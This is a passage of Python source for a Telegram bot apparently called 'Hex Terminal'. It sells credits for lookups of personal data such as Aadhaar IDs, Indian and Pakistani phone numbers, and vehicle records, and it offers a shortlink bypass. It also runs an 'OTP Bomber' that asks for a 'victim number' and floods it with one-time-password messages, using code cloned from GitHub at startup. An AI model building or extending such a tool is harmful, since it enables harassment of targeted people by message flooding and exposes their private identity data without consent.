        if uid == ADMIN_ID and uid in ADMIN_STATE:
            state = ADMIN_STATE.pop(uid)
            if state == "gen":
                try: cr = int(txt); code = generate_redeem_code(cr); msg = await update.message.reply_text(f"<blockquote>✅ <code>{code}</code> | 💰 {cr}cr</blockquote>", parse_mode=ParseMode.HTML)
                except: msg = await update.message.reply_text("<blockquote>❌ Number</blockquote>", parse_mode=ParseMode.HTML)
                asyncio.create_task(auto_del(msg)); return
            elif state == "credit":
                p = txt.split()
                if len(p) >= 2: bal = add_credits(p[0], int(p[1])); msg = await update.message.reply_text(f"<blockquote>✅ +{p[1]} | {bal}</blockquote>", parse_mode=ParseMode.HTML)
                else: msg = await update.message.reply_text("<blockquote>❌ Format: ID AMOUNT</blockquote>", parse_mode=ParseMode.HTML)
                asyncio.create_task(auto_del(msg)); return
            elif state == "bcast":
                users = load_json(USERS_FILE); cnt = 0
                for u in users:
                    try: await context.bot.send_message(chat_id=int(u), text=f"📢 {txt}"); cnt += 1
                    except: pass
                msg = await update.message.reply_text(f"<blockquote>✅ Sent: {cnt}</blockquote>", parse_mode=ParseMode.HTML)
                asyncio.create_task(auto_del(msg)); return
        
        user = get_user(uid)
        if not user.get("verified"):
            if await check_channels(uid, context): user["verified"] = True; save_user(uid, user); await main_menu(update, context)
            else: await show_verification_page(update, context)
            return
        
        if txt in ["👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "👑 ᴀᴅᴍɪɴ"]: await admin_panel(update, context)
        
        elif txt in ["ᴛɢ ɪᴅ ➜ 📞 ɴᴜᴍʙᴇʀ 🔍"]:
            if not s.get("tgid_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'TG'
            btn = [[InlineKeyboardButton("🤖 @ChatIdInfoBot", url="https://t.me/ChatIdInfoBot")]]
            m = await update.message.reply_text("<blockquote>📱 TG ID</blockquote>\n<i>7123181749</i>", reply_markup=InlineKeyboardMarkup(btn), parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt in ["🏦 ɪꜰꜱᴄ ɪɴꜰᴏ➜🔎"]:
            if not s.get("ifsc_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'IFSC'
            m = await update.message.reply_text("<blockquote>🏦 IFSC</blockquote>\n<i>SBIN0001234</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt in ["🔗 ʟɪɴᴋ ʙʏᴘᴀꜱꜱ"]:
            if not s.get("bypass_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'SHORTLINK'
            m = await update.message.reply_text("<blockquote>🔗 Bypass</blockquote>\n<i>https://indianshortner.in/xxxx</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "🇮🇳 ɪɴᴅ ɴᴜᴍʙᴇʀ ɪɴꜰᴏ➜👤":
            if not s.get("mobile_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'MOBILE'
            m = await update.message.reply_text("<blockquote>🇮🇳 Mobile</blockquote>\n<i>9876543210</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "🪪 ᴀᴀᴅʜᴀʀ ɪɴꜰᴏ➜👤":
            if not s.get("aadhaar_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'AADHAAR'
            m = await update.message.reply_text("<blockquote>🪪 Aadhaar</blockquote>\n<i>123456789012</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "🚘 ʀᴄ ᴅᴇᴛᴀɪʟꜱ":
            if not s.get("rc_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'VEHICLE'
            m = await update.message.reply_text("<blockquote>🚘 RC</blockquote>\n<i>KA01AB3256</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "📋 ɢꜱᴛ ʟᴏᴏᴋᴜᴘ":
            if not s.get("gst_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'GST'
            m = await update.message.reply_text("<blockquote>📋 GST</blockquote>\n<i>19BOKPS7056D1ZI</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "🇵🇰 ᴘᴀᴋ ɴᴜᴍʙᴇʀ ɪɴꜰᴏ":
            if not s.get("pak_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'PAK'
            m = await update.message.reply_text("<blockquote>🇵🇰 Pakistan</blockquote>\n<i>923078750447</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt == "💣 ᴏᴛᴘ ʙᴏᴍʙᴇʀ":
            if not s.get("bomber_enabled",True): await update.message.reply_text("<blockquote>📴 Disabled</blockquote>", parse_mode=ParseMode.HTML); return
            context.user_data['mode'] = 'BOMBER'
            m = await update.message.reply_text(
                "<blockquote>💣 OTP Bomber</blockquote>\n"
                "<blockquote>⚠️ Only for Indian numbers (+91)</blockquote>\n"
                "<blockquote>📝 Enter victim number:</blockquote>\n"
                "<i>Example: +919876543210 or 9876543210</i>",
                parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m))
        
        elif txt in ["👥 ɪɴᴠɪᴛᴇ & ᴇᴀʀɴ", "👥 ɪɴᴠɪᴛᴇ"]:
            user = get_user(uid); bot_username = context.bot.username or BOT_USERNAME
            link = f"https://t.me/{bot_username}?start={user['invite_code']}"
            m = await update.message.reply_text(f"<blockquote>👥 Invite (+{INVITE_CREDITS}cr)</blockquote>\n<blockquote><code>{link}</code></blockquote>\n<blockquote>👥 {user.get('invites',0)} | 💰 {user.get('credits',0)}</blockquote>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m, 120))
        
        elif txt in ["🎫 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ"]:
            context.user_data['redeem_mode'] = True
            m = await update.message.reply_text("<blockquote>🎫 Enter code:</blockquote>\n<i>HEX-XXXXXXXXXX</i>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m, 30))
        
        else:
            if context.user_data.get('redeem_mode'):
                context.user_data['redeem_mode'] = False
                msg = redeem_code(uid, txt) if txt.upper().startswith("HEX-") else (False, "❌ Invalid format!")
                m = await update.message.reply_text(f"<blockquote>{msg[1]}</blockquote>", parse_mode=ParseMode.HTML)
                asyncio.create_task(auto_del(m)); return
            
            mode = context.user_data.get('mode')
            if mode:
                if txt.upper().startswith("HEX-") and len(txt) > 10:
                    _, msg = redeem_code(uid, txt)
                    m = await update.message.reply_text(f"<blockquote>{msg}</blockquote>", parse_mode=ParseMode.HTML)
                    asyncio.create_task(auto_del(m)); context.user_data['mode'] = None; return
                
                user = get_user(uid)
                if user.get("credits", 0) <= 0:
                    m = await update.message.reply_text("<blockquote>❌ No credits!</blockquote>", parse_mode=ParseMode.HTML)
                    asyncio.create_task(auto_del(m)); context.user_data['mode'] = None; return
                
                await run_query(update, context, mode, txt); context.user_data['mode'] = None
    except Exception as e: logger.error(f"Msg: {e}")

async def run_query(update, context, mode, query):
    if not await net_ok():
        m = await update.message.reply_text("<blockquote>🔴 No internet</blockquote>", parse_mode=ParseMode.HTML)
        asyncio.create_task(auto_del(m)); return
    
    # OTP BOMBER
    if mode == 'BOMBER':
        await update.message.reply_chat_action(ChatAction.TYPING)
        st = await update.message.reply_text("<blockquote>💣 Starting bomber...</blockquote>\n<blockquote>⏳ This may take up to 2 minutes</blockquote>", parse_mode=ParseMode.HTML)
        
        success, message = run_otp_bomber(query)
        use_credit(update.effective_user.id)
        
        result = f"<blockquote>💣 {'Completed!' if success else 'Failed'}</blockquote>\n<blockquote>📞 Target: <code>{query}</code></blockquote>\n<blockquote>{message}</blockquote>"
        if success: result += "\n<blockquote>✅ OTPs are being sent!</blockquote>"
        
        user = get_user(update.effective_user.id)
        final = f"{result}\n{SEP}\n<blockquote>💰 CR: {user.get('credits',0)} | ⏱ {AUTO_DELETE_TIME}s</blockquote>{FOOTER}"
        await st.edit_text(final, parse_mode=ParseMode.HTML)
        asyncio.create_task(auto_del(st))
        return
    
    await update.message.reply_chat_action(ChatAction.TYPING)
    names = {'TG':'📱','IFSC':'🏦','SHORTLINK':'🔗','AADHAAR':'🪪','MOBILE':'🇮🇳','VEHICLE':'🚘','GST':'📋','PAK':'🇵🇰'}
    st = await update.message.reply_text("<blockquote>🟩 Searching...</blockquote>", parse_mode=ParseMode.HTML)
    lt = asyncio.create_task(loading_animation(st, names.get(mode, '')))
    
    credit_deducted = False
    
    try:
        if mode in ['AADHAAR', 'MOBILE', 'VEHICLE']:
            cm = {'AADHAAR': '2', 'MOBILE': '1', 'VEHICLE': '4'}
            sm = {'AADHAAR': 'aadhaar', 'MOBILE': 'mobile', 'VEHICLE': 'vehicle'}
            raw = run_india_script(cm[mode], query)
            if raw:
                records = parse_all_india_records(raw)
                result = format_records_result(records, sm[mode])
                if records and "❌" not in str(result):
                    use_credit(update.effective_user.id); credit_deducted = True
            else:
                result = "<blockquote>❌ Script failed</blockquote>"
            
            if not credit_deducted:
                result = "<blockquote>❌ No records</blockquote>"
                lt.cancel()
                try: await lt
                except asyncio.CancelledError: pass
                final = f"{result}\n{SEP}\n<blockquote>💰 No credit deducted</blockquote>{FOOTER}"
                sent = await st.edit_text(final, parse_mode=ParseMode.HTML)
                asyncio.create_task(auto_del(sent)); return
        else:
            async with aiohttp.ClientSession() as s:
                if mode == 'TG': result = await chatid_lookup(s, query)
                elif mode == 'IFSC': result = await ifsc_lookup(s, query)
                elif mode == 'SHORTLINK': result = await bypass_lookup(s, query)
                elif mode == 'GST': result = await gst_lookup(s, query)
                elif mode == 'PAK': result = await pakistan_lookup(s, query)
                else: result = "❌"
            
            if result and "❌" not in str(result) and "unavailable" not in str(result).lower():
                use_credit(update.effective_user.id); credit_deducted = True
        
        lt.cancel()
        try: await lt
        except asyncio.CancelledError: pass
        
        user = get_user(update.effective_user.id)
        final = f"{result}\n{SEP}\n<blockquote>{'💰 CR: '+str(user['credits'])+' |' if credit_deducted else '💰 No credit deducted |'} ⏱ {AUTO_DELETE_TIME}s</blockquote>{FOOTER}"
        sent = await st.edit_text(final, parse_mode=ParseMode.HTML)
        asyncio.create_task(auto_del(sent))
    except Exception as e:
        lt.cancel(); logger.error(f"Query: {e}")
        try: await st.edit_text(f"<blockquote>⚠️ Error</blockquote>{FOOTER}", parse_mode=ParseMode.HTML)
        except: pass

def main():
    print("🔄 Hex Terminal...")
    try: subprocess.run([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4"], capture_output=True, timeout=30)
    except: pass
    
    setup_verify_script()
    setup_otp_bomber()  # Clone the real bomber
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify_cb, pattern="^verify$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^ad_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))
    print(f"✅ {BOT_NAME} Ready!")
    print("💣 OTP Bomber: Cloned from GitHub")
    app.run_polling()

if __name__ == '__main__':
    main()